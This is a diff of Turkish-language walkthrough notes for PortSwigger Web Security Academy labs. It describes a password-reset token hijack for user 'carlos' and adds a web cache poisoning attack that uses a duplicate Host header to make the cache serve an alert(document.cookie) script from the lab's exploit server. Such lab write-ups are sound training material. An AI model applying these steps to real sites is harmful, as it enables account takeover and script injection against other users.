@@ -11,7 +11,7 @@ olacak şekilde düzenliyoruz ve send ediyoruz.
 GET /forgot-password  isteğinde  temp-forgot-password-token olarak gönderilen tokeni carlos için oluşturuyor.
 Yeni bir password sıfırlama tokeni oluşturacak ve bunu access loglarından okuyabiliyoruz.
 Email sunucusuna ilk gelen mail adresindeki tokeni carlosa gelen tokenle güncelleyince carlos için şifre değiştirme sayfasına yönlendiriyor.
-https://0a6c006a039ad00c8018c6ef005600af.web-security-academy.net/my-account?id=carlos
+https://$yourlabsid.web-security-academy.net/my-account?id=carlos
 Ve parola değeri değiştirilmiş carlos kullanıcısı ile giriş yapınca lab çözülüyor.
 
 
@@ -27,4 +27,19 @@ GET /admin/delete?username=carlos HTTP/2 => send ederek carlosun silindiğini g�
 
 
 3
+
+Belirsiz istekler yoluyla web önbelleği zehirlenmesi
+
+GET / HTTP/1.1 isteğinde 2inci bir host headeri ekleyebiliyoruz ve bunu hafızada tutuyor.
+X-Cache: miss 'i /?cb=123 olarak hit olana kadar send ettik.
+alert(document.cookie) => body yazıp store ettik.
+ikinci host değerine örnegin Host: abc123 yazdık send ettik ve sonra silip tek host headeri gönderince tekrar cachelendiğini gördük.
+Önemli olarak, ikinci Host başlığınızın keyfi değerinin, bir betiği  içe aktarmak için kullanılan mutlak bir URL'de yansıtıldığını fark edin
+/resources/js/tracking.js => exploit serveri güncelledik.
+Host: $yourlabsid.h1-web-security-academy.net => your labs id
+
+Host: exploit-$exploitserverid.exploit-server.net => exploit server id
+
+
+4
 
